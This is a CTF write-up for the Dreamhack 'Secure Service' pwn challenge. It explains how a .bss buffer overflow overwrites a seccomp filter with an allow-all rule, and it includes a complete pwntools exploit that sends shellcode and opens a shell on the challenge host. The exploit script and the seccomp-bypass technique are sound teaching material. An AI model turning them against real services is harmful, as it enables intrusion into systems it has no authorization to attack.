+++
date = '2026-05-20'
draft = false
title = 'Dreamhack Secure Service Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
We made a nice "sandbox" program. feel free to attack our service :)

---

```c
__int64 bof()
{
  puts("You chose to bof to attack my system.");
  printf("payload: ");
  return __isoc99_scanf("%278s", &g_buf);
}
```

```c
int sandbox()
{
  int result; // eax

  if ( prctl(38, 1, 0, 0, 0) == -1 )
    exit(1);
  result = prctl(22, seccomp_mode, &prog);
  if ( result == -1 )
    exit(1);
  return result;
}
```

## Identifying the vulnerabilities

`seccomp-tools` crashed when I was trying to use it with this challenge. Pretty annoying.

Anyways, the `prctl(38, 1, 0, 0, 0)` represents `PR_SET_NO_NEW_PRIVS`. The `prctl(22, seccomp_mode, &prog)` is `PR_SET_SECCOMP`, which will do two things based on the `seccomp_mode`:

- If it's `1`, then `SECCOMP_MODE_STRICT`, which means `read` and `write` only;

- If it's `2`, then it will take a filter stored in the third argument, `&prog` here.

The filter happens to be in `.bss` right after the overflow we get in `g_buf`. After the filter is `seccomp_mode`, also in `.bss`. So we can overwrite the filter to become `0x06 0x00 0x00 0x7fff0000  return ALLOW` instead of the current constraints, and we can overwrite the `seccomp_mode` to be `2`, to enable filtering rather than `SECCOMP_MODE_STRICT`.

By *current constraints* I mean the values the filter is initialized with:

```bash
0x555555558100 <filter>:        0x0000000400000020      0xc000003e00010015
0x555555558110 <filter+16>:     0x0000000000000006      0x0000000000000000
```

`0x06 0x00 0x00 0x7fff0000` looks a little different in little endian. This is the structure of an instruction:

```c
struct sock_filter {
    __u16 code; //(opcode/instruction) 2 bytes
    __u8  jt; //(offset jump if true) 1 byte
    __u8  jf; //(offset jump if false) 1 byte
    __u32 k;  //(constant) 4 bytes
};
```

So the values are actually `0x0006`, `0x00`, `0x00` and `0x7fff0000`. In little endian, `0600`, `00`, `00` and `0000ff7f`. So we send them in the opposite-endianness hex with p64 for them to lay out like this. It's a bit redundant but it requires less typing.

Anyways, that's about it!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/secureservice/deploy/secure-service')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:12367'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

#first- overwrite filter with empty 
#empty is return allow
# 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
# we send it like this
allow = p64(0x7fff000000000006)

#gdb.attach(p, gdbscript = '''
#brva 0x1349
#c
#''')

p.recvuntil(b"? ")
p.sendline(b"bof")
p.recvuntil(b": ")
#before
#0x555555558100 <filter>:        0x0000000400000020      0xc000003e00010015
#0x555555558110 <filter+16>:     0x0000000000000006      0x0000000000000000


payload =  b'\x41'*128 + allow * 4 + p64(0x0)*12  + p64(0x2)
p.sendline(payload)


sh = asm(shellcraft.sh())
p.recvuntil(b"? ")
p.sendline(b"shellcode")
p.recvuntil(b": ")
p.send(sh)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/secureservice.py)**.
